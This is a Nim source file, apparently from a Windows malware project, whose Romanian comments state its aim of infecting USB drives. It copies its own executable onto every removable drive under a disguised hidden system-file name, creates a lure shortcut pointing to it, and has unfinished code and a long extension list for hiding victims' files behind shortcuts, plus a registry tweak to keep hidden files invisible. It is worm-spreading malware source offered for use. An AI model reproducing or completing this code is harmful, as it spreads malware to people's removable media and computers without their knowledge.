## aici o sa fac o func cu care infectez usburi
## 
## o sa am nev de asta
## key: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced
## value: Hidden = 2
## 
## ca sa nu se vada fisierele ascunse puse pe drive
## 
## TODO: termina asta

from os import walkDirRec
from os import splitFile
from os import getAppFilename
from os import copyFile
from os import `/`
from bitops import bitor

from winim/inc/windef import DWORD
from winim/inc/windef import FILE_ATTRIBUTE_READONLY
from winim/inc/windef import FILE_ATTRIBUTE_HIDDEN
from winim/inc/windef import FILE_ATTRIBUTE_NOT_CONTENT_INDEXED
from winim/inc/windef import FILE_ATTRIBUTE_SYSTEM
from winim/inc/windef import UINT
from winim/inc/windef import PULARGE_INTEGER
from winim/inc/windef import NULL
from winim/inc/windef import LPCWSTR
from winim/inc/windef import MAX_PATH
from winim/inc/windef import PVOID

from winim/inc/winbase import GetFileAttributes
from winim/inc/winbase import SetFileAttributes
from winim/inc/winbase import GetDriveTypeW
from winim/inc/winbase import DRIVE_REMOVABLE
from winim/inc/winbase import GetDiskFreeSpaceExW
from winim/inc/winbase import GetVolumeInformationW

from winim/inc/shellapi import IShellLink
from winim/inc/shellapi import CLSID_ShellLink
from winim/inc/shellapi import IID_IShellLink
from winim/inc/shellapi import winimConverterIShellLinkWToIUnknown
from winim/inc/shellapi import SetPath
from winim/inc/shellapi import SetIconLocation

from winim/inc/objbase import Save
from winim/inc/objbase import Release
from winim/inc/objbase import QueryInterface
from winim/inc/objbase import winimConverterIPersistFileToIUnknown
from winim/inc/objbase import IPersistFile
from winim/inc/objbase import CoInitialize
from winim/inc/objbase import CoCreateInstance
from winim/inc/objbase import CLSCTX_LOCAL_SERVER
from winim/inc/objbase import IID_IPersistFile

from winim/winstr import winstrConverterStringToLPWSTR
from winim/winstr import winstrConverterWStringToLPWSTR
from winim/winstr import newWString
from winim/winstr import `$`

from winim/utils import `&`
from winim/utils import winimConverterBooleanToBOOL

const extensions = [
  ".aif",    # AIF audio file
  ".cda",    # CD audio track file
  ".mid",
  ".midi",   # MIDI audio file.
  ".mp3",    # MP3 audio file
  ".mpa",    # MPEG-2 audio file
  ".ogg",    # Ogg Vorbis audio file
  ".wav",    # WAV file
  ".wma",    # WMA audio file
  ".wpl",    # Windows Media Player playlist
  ".7z",     # 7-Zip compressed file
  ".arj",    # ARJ compressed file
  ".deb",    # Debian software package file
  ".pkg",    # Package file
  ".rar",    # RAR file
  ".rpm",    # Red Hat Package Manager
  ".tar.gz", # Tarball compressed file
  ".z",      # Z compressed file
  ".zip",    # Zip compressed file"
  ".bin",    # Binary disc image
  ".dmg",    # macOS X disk image
  ".iso",    # ISO disc image
  ".toast",  # Toast disc image
  ".csv",    # Comma separated value file
  ".dbf",    # Database file
  ".log",    # Log file
  ".mdb",    # Microsoft Access database file
  ".sav",    # Save file (e.g., game save file)
  ".sql",    # SQL database file
  ".tar",    # Linux / Unix tarball file archive
  ".xml",    # XML file
  ".email",  # Outlook Express e-mail message file.
  ".eml",    # E-mail message file from multiple e-mail clients, including Gmail.
  ".emlx",   # Apple Mail e-mail file.
  ".msg",    # Microsoft Outlook e-mail message file.
  ".oft",    # Microsoft Outlook e-mail template file.
  ".ost",    # Microsoft Outlook offline e-mail storage file.
  ".pst",    # Microsoft Outlook e-mail storage file.
  ".vcf",    # E-mail contact file.
  ".apk",    # Android package file
  ".bat",    # Batch file
  ".bin",    # Binary file
  ".cgi",
  ".pl",     # Perl script file
  ".com",    # MS-DOS command file
  ".exe",    # Executable file
  ".gadget", # Windows gadget
  ".jar",    # Java Archive file
  ".msi",    # Windows installer package
  ".py",     # Python file
  ".wsf",    # Windows Script File
  ".fnt",    # Windows font file
  ".fon",    # Generic font file
  ".otf",    # Open type font file
  ".ttf",    # TrueType font file
  ".ai",     # Adobe Illustrator file
  ".bmp",    # Bitmap image
  ".gif",    # GIF image
  ".ico",    # Icon file
  ".jpeg",
  ".jpg",    # JPEG image
  ".png",    # PNG image
  ".ps",     # PostScript file
  ".psd",    # PSD image
  ".svg",    # Scalable Vector Graphics file
  ".tif",
  ".tiff",   # TIFF image
  ".cer",    # Internet security certificate
  ".key",    # Keynote presentation
  ".odp",    # OpenOffice Impress presentation file
  ".pps",    # PowerPoint slide show
  ".ppt",    # PowerPoint presentation
  ".pptx",   # PowerPoint Open XML presentation
  ".ods",    # OpenOffice Calc spreadsheet file
  ".xls",    # Microsoft Excel file
  ".xlsm",   # Microsoft Excel file with macros
  ".xlsx",   # Microsoft Excel Open XML spreadsheet file
  ".icns",   # macOS X icon resource file
  ".ico",    # Icon file
  ".ini",    # Initialization file
  ".msi",    # Windows installer package
  ".3g2",    # 3GPP2 multimedia file
  ".3gp",    # 3GPP multimedia file
  ".avi",    # AVI file
  ".flv",    # Adobe Flash file
  ".h264",   # H.264 video file
  ".m4v",    # Apple MP4 video file
  ".mkv",    # Matroska Multimedia Container
  ".mov",    # Apple QuickTime movie file
  ".mp4",    # MPEG4 video file
  ".mpg",    # MPEG video file
  ".mpeg",   # MPEG video file
  ".rm",     # RealMedia file
  ".swf",    # Shockwave flash file
  ".vob",    # DVD Video Object
  ".wmv",    # Windows Media Video file
  ".doc",
  ".docx",   # Microsoft Word file
  ".odt",    # OpenOffice Writer document file
  ".pdf",    # PDF file
  ".rtf",    # Rich Text Format
  ".tex",    # A LaTeX document file
  ".txt",    # Plain text file
  ".wpd",    # WordPerfect document
]

proc setAttributes(attr: DWORD): DWORD =
  result = bitor(attr, FILE_ATTRIBUTE_READONLY)
  result = bitor(result, FILE_ATTRIBUTE_HIDDEN)
  result = bitor(result, FILE_ATTRIBUTE_NOT_CONTENT_INDEXED)
  result = bitor(result, FILE_ATTRIBUTE_SYSTEM)

proc hideFile(path: string): void =
  let attr: DWORD = GetFileAttributes(path)

  let newAttr: DWORD = setAttributes(attr)

  SetFileAttributes(path, newAttr)


proc checkDrive(drivePath: string): void =
  for path in walkDirRec(drivePath):
    let ext: string = splitFile(path).ext

    for extension in extensions:
      if ext == extension: # valid extension
        echo path
        ## > create lnk file
        ## > hide original
        break


proc createShortcut(file: string, path: string): void =
  var
    pIL: ptr IShellLink
    pPF: ptr IPersistFile

  CoInitialize(nil)

  CoCreateInstance(&CLSID_ShellLink, nil, CLSCTX_LOCAL_SERVER,
      &IID_IShellLink, cast[ptr PVOID](&pIL))

  pIL.QueryInterface(&IID_IPersistFile, cast[ptr PVOID](&pPF))

  pIL.SetPath(file)
  # pIL.SetIconLocation(r"C:\Windows\explorer.exe", 0)
  pIL.Release()

  pPF.Save(path, true)

  pPF.Release()

proc searchForUSB(): void =
  let appName: string = getAppFilename()
  for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
    let drivePath: string = letter & r":\"
    let driveType: UINT = GetDriveTypeW(drivePath)

    if driveType == DRIVE_REMOVABLE:
      var freeSpaceInBytes: int64
      GetDiskFreeSpaceExW(drivePath, cast[PULARGE_INTEGER](
          addr freeSpaceInBytes), NULL, NULL)

      if freeSpaceInBytes div 1000000 >= 2: # if at least 2mb free
        var driveName: LPCWSTR = newWString(MAX_PATH)

        GetVolumeInformationW(drivePath, driveName, MAX_PATH, NULL, NULL, NULL,
            NULL, 0)

        let dest: string = drivePath / "$Win" & $driveName & ".dump"
        ## possible names:
        ## $Win
        ## $WinSearch
        ## $WinQuery
        ## $WinFind
        if appName != dest:
          echo dest

          copyFile(appName, dest)
          hideFile(dest)
          createShortcut(dest, drivePath / "abi.lnk")
          # checkDrive(drivePath)

proc initInfectThread*(): void {.thread.} =
  searchForUSB()
